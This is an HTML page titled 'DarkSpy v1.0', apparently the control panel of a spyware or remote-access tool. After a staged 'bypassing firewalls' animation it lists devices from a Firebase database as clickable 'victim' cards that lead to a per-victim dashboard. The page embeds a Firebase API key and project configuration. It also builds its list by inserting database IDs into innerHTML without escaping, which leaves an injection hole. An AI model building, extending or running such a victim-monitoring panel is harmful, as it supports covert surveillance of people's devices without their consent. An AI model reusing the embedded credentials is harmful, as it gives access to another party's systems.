<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>DarkSpy v1.0 - DARK MASTER</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --red: #ff0000; --bg: #000; --green: #00ff41; }
        body { background: var(--bg); color: var(--green); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; }
        #dots-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.7; }
        
        .header { border-bottom: 2px solid var(--red); padding: 10px 20px; display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.9); }
        .main-layout { display: flex; flex-direction: column; align-items: center; padding: 30px 15px; position: relative; z-index: 1; }
        
        .branding img { width: 100px; border: 2px solid var(--red); border-radius: 50%; padding: 5px; box-shadow: 0 0 20px red; margin-bottom: 10px; }
        .branding h1 { color: var(--red); letter-spacing: 5px; font-size: 24px; text-shadow: 0 0 10px red; margin-bottom: 20px; font-weight: 900; }

        .scan-container { width: 100%; max-width: 500px; background: rgba(15, 0, 0, 0.9); border: 2px solid var(--red); padding: 20px; min-height: 200px; }
        .scan-line { font-size: 14px; font-weight: 900; margin-bottom: 10px; border-left: 4px solid var(--red); padding-left: 12px; color: var(--green); }

        .victim-card { border: 2px solid var(--red); background: rgba(20,0,0,0.85); padding: 15px; margin-bottom: 15px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: 0.3s; width: 100%; max-width: 500px; }
        .victim-card:hover { background: var(--red); color: #000; transform: scale(1.03); }
        .v-info { display: flex; align-items: center; gap: 15px; }
        .v-info img { width: 50px; height: 50px; border-radius: 50%; border: 2px solid var(--red); }
        .v-info b { font-size: 18px; letter-spacing: 1px; font-weight: 900; }
        .status { color: var(--green); font-size: 12px; font-weight: 900; animation: blink 0.8s infinite; }
        @keyframes blink { 50% { opacity: 0; } }
    </style>
</head>
<body>
    <canvas id="dots-canvas"></canvas>
    <div class="header">
        <div style="display:flex; align-items:center; gap:10px;">
            <img src="https://i.postimg.cc/RCYbwpF3/favicon.png" width="25">
            <span style="color:var(--red); font-weight:bold; font-size:16px;">DARKSPY <span style="color:white">V1.0</span></span>
        </div>
        <span style="color:red; font-size:12px; font-weight:bold;">SERVER: ONLINE</span>
    </div>

    <div class="main-layout">
        <div class="branding">
            <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
            <h1>DARK OF MASTER TERMINAL</h1>
        </div>

        <div class="scan-container" id="scanner">
            </div>

        <div id="victim-list" style="display:none; width:100%; flex-direction: column; align-items: center;">
            </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const firebaseConfig = { apiKey: "AIzaSyA5-E06ArKA7Unf-fHtCflOEwu2p8VM9kI", authDomain: "dark-5b7c9.firebaseapp.com", databaseURL: "https://dark-5b7c9-default-rtdb.firebaseio.com", projectId: "dark-5b7c9", storageBucket: "dark-5b7c9.firebasestorage.app", messagingSenderId: "1029612020880", appId: "1:1029612020880:web:1d2d6f3ee96af0cf06a415" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        // Matrix Animation
        const canvas = document.getElementById('dots-canvas'); const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        let dots = Array(120).fill().map(() => ({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, r: 1.5, s: 0.8 }));
        function animate() { ctx.fillStyle = "rgba(0,0,0,0.2)"; ctx.fillRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(255,0,0,0.6)"; dots.forEach(d => { ctx.beginPath(); ctx.arc(d.x, d.y, d.r, 0, Math.PI*2); ctx.fill(); d.y += d.s; if(d.y > canvas.height) d.y = 0; }); requestAnimationFrame(animate); }
        animate();

        // Scanning Logic
        const scn = document.getElementById('scanner');
        let lines = [">_ Handshaking...", ">_ Bypassing Firewalls...", ">_ Found Payloads...", ">_ Decrypting IDs...", ">_ ACCESS GRANTED!"];
        let lIdx = 0;
        function typeScan() {
            if(lIdx < lines.length) {
                let d = document.createElement('div'); d.className = "scan-line"; d.innerText = lines[lIdx];
                scn.appendChild(d); lIdx++; setTimeout(typeScan, 500);
            } else {
                setTimeout(() => { scn.style.display = 'none'; loadList(); }, 800);
            }
        }
        typeScan();

        function loadList() {
            const list = document.getElementById('victim-list'); list.style.display = 'flex';
            db.ref('online/onlinetheoneandonly').on('value', snap => {
                list.innerHTML = "";
                const data = snap.val();
                if(!data) return;
                Object.keys(data).forEach(id => {
                    list.innerHTML += `
                        <div class="victim-card" onclick="location.href='dashboard.html?id=${id}'">
                            <div class="v-info">
                                <img src="https://i.postimg.cc/htJrxvX0/Screenshot-20260205-060223.png">
                                <b>${id}</b>
                            </div>
                            <span class="status">[ ONLINE ]</span>
                        </div>`;
                });
            });
        }
    </script>
</body>
</html>
